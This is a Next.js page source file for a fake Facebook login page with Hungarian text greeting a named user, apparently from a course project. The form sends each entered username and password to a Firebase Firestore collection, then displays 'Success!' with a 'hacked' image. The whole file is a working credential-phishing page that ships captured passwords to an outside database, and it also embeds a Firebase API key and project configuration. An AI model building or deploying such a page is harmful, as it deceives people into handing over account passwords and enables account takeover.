import Head from "next/head";
import { Inter } from "next/font/google";
import styles from "@/styles/Home.module.css";
import { useState } from "react";
const inter = Inter({ subsets: ["latin"] });
import Image from "next/image";

import { initializeApp } from "firebase/app";
import { addDoc, collection, getFirestore } from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyCgJGcnhjmC3-HlgwpJiOC-4_xF-YOOV_U",
  authDomain: "in5290-74a8f.firebaseapp.com",
  projectId: "in5290-74a8f",
  storageBucket: "in5290-74a8f.appspot.com",
  messagingSenderId: "389040688580",
  appId: "1:389040688580:web:c74ae5dbd8ae9d0edee891",
  measurementId: "G-1SQ0JSRCRC",
};

export default function Home() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [hasLoggedIn, setHasLoggedIn] = useState(false);

  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  async function onSumbit(e: any) {
    e.preventDefault();

    setIsLoading(true);

    await addDoc(collection(db, "users"), {
      first: email,
      last: password,
      time: new Date(),
    });

    setIsLoading(false);
    setHasLoggedIn(true);
  }

  return (
    <>
      <Head>
        <title>Facebook log in</title>
        <meta name="description" content="Generated by create next app" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <main className={`${styles.main} ${inter.className}`}>
        {!hasLoggedIn && (
          <form className={`${styles.form}`} onSubmit={onSumbit}>
            <div
              style={{
                display: "flex",
                gap: "20px",
                alignItems: "center",
              }}
            >
              <Image
                src={"/Facebook_Logo_2023.png"}
                alt="Facebook logo"
                width={60}
                height={60}
              />

              <h1>Facebook</h1>
            </div>
            <div>
              <h2>Üdv újra László!</h2>
              <p>Kérjük, jelentkezzen be fiókjába</p>
            </div>
            <input
              className={`${styles.inputField}`}
              type="text"
              placeholder="felhasználónév"
              onChange={(e) => setEmail(e.target.value)}
            />
            <input
              className={`${styles.inputField}`}
              type="password"
              placeholder="Jelszó"
              onChange={(e) => setPassword(e.target.value)}
            />
            <button
              className={`${styles.submitBtn}`}
              type="submit"
              disabled={isLoading}
              style={{ cursor: isLoading ? "not-allowed" : "pointer" }}
            >
              {isLoading && "Belépés ..."}
              {!isLoading && "Bejelentkezés"}
            </button>
          </form>
        )}
        {hasLoggedIn && (
          <div className={`${styles.success}`}>
            <h1>Success!</h1>
            <Image
              src="/hacked.jpeg"
              alt="Hacked"
              width={400}
              height={400}
              style={{
                width: "100%",
                height: "100%",
                objectFit: "contain",
              }}
            />
          </div>
        )}
      </main>
    </>
  );
}
